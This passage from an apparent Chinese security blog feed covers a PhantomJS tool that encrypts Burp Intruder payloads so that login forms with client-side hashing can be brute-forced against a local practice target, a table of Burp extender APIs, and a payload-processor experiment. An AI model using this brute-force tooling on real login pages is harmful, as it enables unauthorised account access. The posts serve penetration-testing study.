class="number">200</span>;</span><br><span class="line">  response.write(encrypt_payload.toString()); <span class="comment">//返回处理好的payload</span></span><br><span class="line">        response.close();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  response.statusCode = <span class="number">200</span>;</span><br><span class="line">    response.write(<span class="string">"^_^\n\rhello jsEncrypter!"</span>);</span><br><span class="line">          response.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="0x03演示"><a href="#0x03演示" class="headerlink" title="0x03演示"></a>0x03演示</h2><p>完整的代码请移步github: <code>http://github.com/c0ny1/jsEncrypter</code></p><p>大家自行下载，编译好,最后加载到Burp Suite中！</p><p><img src="/articles/2017/jsEncrypter/tab.png" alt="图2-插件界面"></p><h4 id="1-靶机搭建"><a href="#1-靶机搭建" class="headerlink" title="(1) 靶机搭建"></a>(1) 靶机搭建</h4><p>项目jsEncrytper/server目录下提供一个php编写的靶机，我们用phpStudy把他运行起来。靶机目前支持的加密算法有7中：</p><ul><li>base64 （PS：严格来说base64是一种编码，不是一种加密算法）</li><li>md5</li><li>sha1</li><li>sha254</li><li>sha384</li><li>sha512</li><li>RSA</li></ul><p>我们选择sha1来进行演示。</p><p><img src="/articles/2017/jsEncrypter/server.png" alt="图3-靶机"></p><h4 id="2-编写phantomJS脚本"><a href="#2-编写phantomJS脚本" class="headerlink" title="(2) 编写phantomJS脚本"></a>(2) 编写phantomJS脚本</h4><ol><li><p>通过查看靶机页面的js代码，我们知道实现sha1加密的是<code>sha1.js</code>这个文件，我们将它下载下来。</p></li><li><p>复制phantomJS模板代码<code>jsEncrypter/js/jsEncrypter_base.js</code>文件，改名为jsEncrypter_sha1.js。</p></li><li><p>在脚本中加载<code>sha1.js</code>,然后在<code>js_encrypt</code>函数中实现调用加密函数对传入的payload进行加密处理，即可。</p></li></ol><h6 id="完整代码如下："><a href="#完整代码如下：" class="headerlink" title="完整代码如下："></a>完整代码如下：</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webserver = <span class="built_in">require</span>(<span class="string">'webserver'</span>);</span><br><span class="line">server = webserver.create();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">var</span> port = <span class="string">'1664'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载实现加密算法的js脚本</span></span><br><span class="line"><span class="keyword">var</span> wasSuccessful = phantom.injectJs(<span class="string">'sha1.js'</span>);<span class="comment">/*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">js_encrypt</span>(<span class="params">payload</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newpayload;</span><br><span class="line"><span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line">newpayload = hex_sha1(payload);</span><br><span class="line"><span class="comment">/****************************************************/</span></span><br><span class="line"><span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(wasSuccessful)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] load js successful"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[!] ^_^"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] jsEncrypterJS start!"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] address: http://"</span>+host+<span class="string">":"</span>+port);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'[*] load js fail!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> service = server.listen(host+<span class="string">':'</span>+port,<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(request.method == <span class="string">'POST'</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> payload = request.post[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">var</span> encrypt_payload = js_encrypt(payload); </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + payload + <span class="string">':'</span> + encrypt_payload);</span><br><span class="line">response.statusCode = <span class="number">200</span>;</span><br><span class="line">  response.write(encrypt_payload.toString());</span><br><span class="line">        response.close();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  response.statusCode = <span class="number">200</span>;</span><br><span class="line">    response.write(<span class="string">"^_^\n\rhello jsEncrypt!"</span>);</span><br><span class="line">          response.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="3-运行phantomJS脚本"><a href="#3-运行phantomJS脚本" class="headerlink" title="(3) 运行phantomJS脚本"></a>(3) 运行phantomJS脚本</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">λ phantomjs.exe jsEncrypter_sha1.js</span><br><span class="line">[*] load js successful</span><br><span class="line">[!] ^_^</span><br><span class="line">[*] jsEncrypterJS <span class="built_in">start</span>!</span><br><span class="line">[+] address: http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">1664</span></span><br></pre></td></tr></table></figure><h4 id="4-测试是否能成功加密"><a href="#4-测试是否能成功加密" class="headerlink" title="(4) 测试是否能成功加密"></a>(4) 测试是否能成功加密</h4><p><img src="/articles/2017/jsEncrypter/test.gif" alt="图4-测试"></p><h4 id="5-抓包爆破"><a href="#5-抓包爆破" class="headerlink" title="(5) 抓包爆破"></a>(5) 抓包爆破</h4><p><img src="/articles/2017/jsEncrypter/crack.gif" alt="图5-抓包爆破"></p><h2 id="0x04最后的话"><a href="#0x04最后的话" class="headerlink" title="0x04最后的话"></a>0x04最后的话</h2><p>各位如果有更好的解决方案，请留言互相交流。发现项目有bug或者有更好的修改建议，欢迎在github提交issuse，期待我们一起进步！</p><p><strong>项目地址：<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">https://github.com/c0ny1/jsEncrypter</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Burp Suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永远的亚伦·斯沃茨</title>
      <link href="/articles/2017/Aaron-Swartz/"/>
      <url>/articles/2017/Aaron-Swartz/</url>
      
        <content type="html"><![CDATA[<p><img src="/articles/2017/Aaron-Swartz/Aaron-Swartz.png" alt="亚伦·斯沃茨"></p><center><object width="640" height="360"><param name="movie" value="http://swf.ws.126.net/openplayer/v01/-0-2_MB0JQB7H7_MB1EF3EOM-vimg1_ws_126_net//image/snapshot_movie/2015/8/O/N/MB1EF3EON-1429002752199.swf"><param name="allowScriptAccess" value="always"><param name="wmode" value="transparent"><embed src="http://swf.ws.126.net/openplayer/v01/-0-2_MB0JQB7H7_MB1EF3EOM-vimg1_ws_126_net//image/snapshot_movie/2015/8/O/N/MB1EF3EON-1429002752199.swf" type="application/x-shockwave-flash" width="640" height="360" allowfullscreen="true" wmode="transparent" allowscriptaccess="always"></object></center>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite APIs分类归纳</title>
      <link href="/articles/2017/classification-of-burp-apis/"/>
      <url>/articles/2017/classification-of-burp-apis/</url>
      
        <content type="html"><![CDATA[<p>最近一直在研究Burp插件实现高效漏洞挖掘。Burp Suite官方提供的APIs共37个接口。在学习插件编写的过程中，读起来很枯燥。以下是自己学习过程中对APIs进行了一个归纳分类，方便理清各类API的关系。如有错误，烦邮件告知，感激不尽。后面有更好感悟，再更新~</p><p>分了6个大类：插件入口类，UI相关类，工具套件类，HTTP消息处理接口类，辅助类和其他。并从中分出2个小类：四大监听器和四大工厂。</p><h2 id="插件入口类"><a href="#插件入口类" class="headerlink" title="插件入口类"></a>插件入口类</h2><table><thead><tr><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">IBurpExtender</td><td align="center">扩展类</td></tr><tr><td align="center">IBurpExtenderCallbacks</td><td align="center">扩展回调对象</td></tr></tbody></table><h2 id="UI相关类"><a href="#UI相关类" class="headerlink" title="UI相关类"></a>UI相关类</h2><table><thead><tr><th align="center">控件</th><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Burp标签页</td><td align="center">Itab</td><td align="center">Burp标签</td></tr><tr><td align="center">菜单</td><td align="center">IContextMenuFactory</td><td align="center">上下文菜单工厂</td></tr><tr><td align="center"></td><td align="center">IContextMenuInvocation</td><td align="center">上下文菜单调用</td></tr><tr><td align="center">消息编辑器</td><td align="center">IMessageEditorTabFactory</td><td align="center">消息编辑器标签工厂</td></tr><tr><td align="center"></td><td align="center">IMessageEditorTab</td><td align="center">消息编辑器标签</td></tr><tr><td align="center"></td><td align="center">IMessageEditor</td><td align="center">信息编辑器</td></tr><tr><td align="center"></td><td align="center">IMessageEditorController</td><td align="center">信息编辑器的控制器</td></tr><tr><td align="center">文本编辑器</td><td align="center">ITextEditor</td><td align="center">文本编辑器</td></tr></tbody></table><h2 id="工具套件类"><a href="#工具套件类" class="headerlink" title="工具套件类"></a>工具套件类</h2><table><thead><tr><th align="center">套件</th><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">范围(Scope)</td><td align="center">IScopeChangeListener</td><td align="center">范围改变监听器</td></tr><tr><td align="center">代理(Proxy)</td><td align="center">IProxyListener</td><td align="center">代理监听器</td></tr><tr><td align="center"></td><td align="center">IInterceptedProxyMessage</td><td align="center">代理拦截信息</td></tr><tr><td align="center">入侵者（Intruder）</td><td align="center">IIntruderAttack</td><td align="center">入侵者攻击信息</td></tr><tr><td align="center"></td><td align="center">IIntruderPayloadGenerator</td><td align="center">Payload成生器</td></tr><tr><td align="center"></td><td align="center">IIntruderPayloadGeneratorFactory</td><td align="center">payload工厂</td></tr><tr><td align="center"></td><td align="center">IIntruderPayloadProcessor</td><td align="center">Paylaod处理器</td></tr><tr><td align="center">扫描（Scanner）</td><td align="center">IScannerListener</td><td align="center">扫描监听器</td></tr><tr><td align="center"></td><td align="center">IScanIssue</td><td align="center">扫描报告</td></tr><tr><td align="center"></td><td align="center">IScannerCheck</td><td align="center">扫描检查</td></tr><tr><td align="center"></td><td align="center">IScannerInsertionPoint</td><td align="center">扫描插入点</td></tr><tr><td align="center"></td><td align="center">IScannerInsertionPointProvider</td><td align="center">扫描插入点提供者</td></tr><tr><td align="center"></td><td align="center">IScanQueueItem</td><td align="center">扫描队列条目</td></tr><tr><td align="center">会话（session）</td><td align="center">ISessionHandlingAction</td><td align="center">会话处理动作</td></tr></tbody></table><h2 id="HTTP消息处理接口类"><a href="#HTTP消息处理接口类" class="headerlink" title="HTTP消息处理接口类"></a>HTTP消息处理接口类</h2><table><thead><tr><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">IHttpListener</td><td align="center">HTTP消息监听器</td></tr><tr><td align="center">IHttpRequestResponse</td><td align="center">请求响应消息</td></tr><tr><td align="center">IHttpRequestResponsePersisted</td><td align="center">请求响应信息维持</td></tr><tr><td align="center">IHttpRequestResponseWithMarkers</td><td align="center">彩笔</td></tr><tr><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">IRequestInfo</td><td align="center">HTTP服务消息</td></tr><tr><td align="center">IResponseInfo</td><td align="center">请求信息</td></tr><tr><td align="center">IHttpService</td><td align="center">响应消息</td></tr><tr><td align="center">Icookie</td><td align="center">cookie</td></tr><tr><td align="center">Iparameter</td><td align="center">参数</td></tr></tbody></table><h2 id="辅助类"><a href="#辅助类" class="headerlink" title="辅助类"></a>辅助类</h2><table><thead><tr><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">IExtensionHelpers</td><td align="center">辅助类</td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table><thead><tr><th align="center">接口</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ITempFile</td><td align="center">缓存文件</td></tr><tr><td align="center">IExtensionStateListener</td><td align="center">扩展状态监听</td></tr></tbody></table><hr><h2 id="四大监听器"><a href="#四大监听器" class="headerlink" title="四大监听器"></a>四大监听器</h2><table><thead><tr><th align="center">监听器</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">IHttpListener</td><td align="center">Http消息监听器</td></tr><tr><td align="center">IProxyListener</td><td align="center">代理监听器</td></tr><tr><td align="center">IScannerListener</td><td align="center">扫描监听器</td></tr><tr><td align="center">IExtensionStateListener</td><td align="center">扩展状态监听器</td></tr><tr><td align="center">IScopeChangeListener</td><td align="center">范围改变监听器</td></tr></tbody></table><h2 id="四大工厂"><a href="#四大工厂" class="headerlink" title="四大工厂"></a>四大工厂</h2><table><thead><tr><th align="center">工厂</th><th align="center">生成器</th><th align="center">处理器</th></tr></thead><tbody><tr><td align="center">IContextMenuFactory</td><td align="center">IContextMenuInvocation</td><td align="center"></td></tr><tr><td align="center">IMessageEditorTabFactory</td><td align="center">IMessageEditorTab</td><td align="center"></td></tr><tr><td align="center">IIntruderPayloadGeneratorFactory</td><td align="center">IIntruderPayloadGenerator</td><td align="center">IIntruderPayloadProcessor</td></tr><tr><td align="center">IScannerInsertionPointProvider</td><td align="center">IScannerInsertionPoint</td><td align="center"></td></tr></tbody></table><h2 id="关于APIs跟多资料"><a href="#关于APIs跟多资料" class="headerlink" title="关于APIs跟多资料"></a>关于APIs跟多资料</h2><p><a href="https://portswigger.net/burp/extender/api/index.html" target="_blank" rel="noopener">官方在线api</a></p><p><a href="http://www.tuicool.com/articles/aaaa6fA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 上篇</a></p><p><a href="http://www.tuicool.com/articles/eU7vUjA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 下篇</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Burp中的currentPayload和originalPayload</title>
      <link href="/articles/2017/currentPayload-originalPayload/"/>
      <url>/articles/2017/currentPayload-originalPayload/</url>
      
        <content type="html"><![CDATA[<p>在学习burp suite APIs中的Intruder payload处理器的过程中，一直搞不明白IIntruderPayloadProcess接口中processPayload方法的currentPayload和originalPayload参数有啥区别。虽说从名字上看currentPayload就是当前paylaod，originalPayload是原始payload的意思。翻了一下文档，大概知道了它们的区别，但总感觉还是没弄清其本质区别，很不舒服！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is invoked by Burp each time the processor should be applied</span></span><br><span class="line"><span class="comment">     * to an Intruder payload.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> currentPayload The value of the payload to be processed.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> originalPayload The value of the original payload prior to</span></span><br><span class="line"><span class="comment">     * processing by any already-applied processing rules.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> baseValue The base value of the payload position, which will be</span></span><br><span class="line"><span class="comment">     * replaced with the current payload.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The value of the processed payload. This may be</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;null&lt;/code&gt; to indicate that the current payload should be skipped,</span></span><br><span class="line"><span class="comment">     * and the attack will move directly to the next payload.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">byte</span>[] processPayload(</span><br><span class="line">            <span class="keyword">byte</span>[] currentPayload,</span><br><span class="line">            <span class="keyword">byte</span>[] originalPayload,</span><br><span class="line">            <span class="keyword">byte</span>[] baseValue);</span><br></pre></td></tr></table></figure><h2 id="0x01编码"><a href="#0x01编码" class="headerlink" title="0x01编码"></a>0x01编码</h2><p>我们来写两个Payload处理器插件来理解其中的区别，处理器1对payload的处理是在payload后面添加一个1，<br>处理器2对payload的处理是在payload后面添加一个2。处理前会输出currentPayload和originalPayload以供我们研究。具体代码如下：</p><h4 id="intruder-payload-1"><a href="#intruder-payload-1" class="headerlink" title="intruder-payload-1"></a>intruder-payload-1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>,<span class="title">IIntruderPayloadProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> IExtensionHelpers helper;</span><br><span class="line"><span class="keyword">private</span> IBurpExtenderCallbacks callbacks;</span><br><span class="line"><span class="keyword">private</span> PrintWriter stdout;</span><br><span class="line"><span class="keyword">private</span> PrintWriter stderr;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.helper = callbacks.getHelpers();</span><br><span class="line"><span class="keyword">this</span>.callbacks = callbacks;</span><br><span class="line"><span class="keyword">this</span>.stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(),<span class="keyword">true</span>);</span><br><span class="line">callbacks.setExtensionName(<span class="string">"intruder-payload-1"</span>);</span><br><span class="line">callbacks.registerIntruderPayloadProcessor(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getProcessorName</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Processor1"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] processPayload(<span class="keyword">byte</span>[] currentPayload, <span class="keyword">byte</span>[] originalPayload, <span class="keyword">byte</span>[] baseValue) &#123;</span><br><span class="line">stdout.println(getProcessorName());</span><br><span class="line">stdout.println(<span class="string">"currentPayload:"</span>+helper.bytesToString(currentPayload));</span><br><span class="line">stdout.println(<span class="string">"originalPayload:"</span>+helper.bytesToString(originalPayload));</span><br><span class="line">stdout.println(<span class="string">"-------------------------"</span>);</span><br><span class="line"></span><br><span class="line">String newPayload;</span><br><span class="line">newPayload = helper.bytesToString(currentPayload) + <span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">return</span> helper.stringToBytes(newPayload);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="intruder-payload-2"><a href="#intruder-payload-2" class="headerlink" title="intruder-payload-2"></a>intruder-payload-2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>,<span class="title">IIntruderPayloadProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> IExtensionHelpers helper;</span><br><span class="line"><span class="keyword">private</span> IBurpExtenderCallbacks callbacks;</span><br><span class="line"><span class="keyword">private</span> PrintWriter stdout;</span><br><span class="line"><span class="keyword">private</span> PrintWriter stderr;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.helper = callbacks.getHelpers();</span><br><span class="line"><span class="keyword">this</span>.callbacks = callbacks;</span><br><span class="line"><span class="keyword">this</span>.stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(),<span class="keyword">true</span>);</span><br><span class="line">callbacks.setExtensionName(<span class="string">"intruder-payload-2"</span>);</span><br><span class="line">callbacks.registerIntruderPayloadProcessor(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getProcessorName</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Processor2"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] processPayload(<span class="keyword">byte</span>[] currentPayload, <span class="keyword">byte</span>[] originalPayload, <span class="keyword">byte</span>[] baseValue) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">stdout.println(getProcessorName());</span><br><span class="line">stdout.println(<span class="string">"currentPayload:"</span>+helper.bytesToString(currentPayload));</span><br><span class="line">stdout.println(<span class="string">"originalPayload:"</span>+helper.bytesToString(originalPayload));</span><br><span class="line">stdout.println(<span class="string">"-------------------------"</span>);</span><br><span class="line"></span><br><span class="line">String newPayload;</span><br><span class="line">newPayload = helper.bytesToString(currentPayload) + <span class="string">"2"</span>;</span><br><span class="line"><span class="keyword">return</span> helper.stringToBytes(newPayload);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x2测试"><a href="#0x2测试" class="headerlink" title="0x2测试"></a>0x2测试</h2><p>编译后使用burp安装好这两个插件，并随便找一个post包进行测试</p><p><img src="/articles/2017/currentPayload-originalPayload/intruder-payloads-set.png" alt="图1-Intruder payloads设置"></p><p><img src="/articles/2017/currentPayload-originalPayload/intruder-attack.png" alt="图2-Intruder attack"></p><p>去查看了一下Extension中两个插件的<code>Show in UI</code>的信息分别如下：</p><h4 id="intruder-payload-1-1"><a href="#intruder-payload-1-1" class="headerlink" title="intruder-payload-1"></a>intruder-payload-1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Processor1</span><br><span class="line">currentPayload: a</span><br><span class="line">originalPayload: a</span><br><span class="line">-------------------------</span><br><span class="line">Processor1</span><br><span class="line">currentPayload: b</span><br><span class="line">originalPayload: b</span><br><span class="line">-------------------------</span><br><span class="line">Processor1</span><br><span class="line">currentPayload: c</span><br><span class="line">originalPayload: c</span><br><span class="line">-------------------------</span><br><span class="line">Processor1</span><br><span class="line">currentPayload: d</span><br><span class="line">originalPayload: d</span><br><span class="line">-------------------------</span><br><span class="line">Processor1</span><br><span class="line">currentPayload: e</span><br><span class="line">originalPayload: e</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure><h4 id="intruder-payload-2-1"><a href="#intruder-payload-2-1" class="headerlink" title="intruder-payload-2"></a>intruder-payload-2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Processor2</span><br><span class="line">currentPayload: a1</span><br><span class="line">originalPayload: a</span><br><span class="line">-------------------------</span><br><span class="line">Processor2</span><br><span class="line">currentPayload: b1</span><br><span class="line">originalPayload: b</span><br><span class="line">-------------------------</span><br><span class="line">Processor2</span><br><span class="line">currentPayload: c1</span><br><span class="line">originalPayload: c</span><br><span class="line">-------------------------</span><br><span class="line">Processor2</span><br><span class="line">currentPayload: d1</span><br><span class="line">originalPayload: d</span><br><span class="line">-------------------------</span><br><span class="line">Processor2</span><br><span class="line">currentPayload: e1</span><br><span class="line">originalPayload: e</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>综上我们就可以分析出：</p><table><thead><tr><th align="center">处理器</th><th align="center">a</th><th align="center">b</th><th align="center">c</th><th align="center">d</th><th align="center">e</th><th align="center">f</th></tr></thead><tbody><tr><td align="center">Processor1</td><td align="center">a,a</td><td align="center">b,b</td><td align="center">c,c</td><td align="center">d,d</td><td align="center">e,e</td><td align="center">f,f</td></tr><tr><td align="center">Processor1</td><td align="center">a1,a</td><td align="center">b1,b</td><td align="center">c1,c</td><td align="center">d1,d</td><td align="center">e1,e</td><td align="center">f1,f</td></tr></tbody></table><p><strong>所以现在再来理解这两个参数是不是就明了多了， <code>currentPayload</code>参数是当前payload（原始payload被上一个或多个处理器处理过的）,<code>originalPayload</code>参数是原始payload</strong></p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件开发 </tag>
            
            <tag> burp suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优化批量破解shadow</title>
      <link href="/articles/2017/batch-crack-shadows/"/>
      <url>/articles/2017/batch-crack-shadows/</url>
      
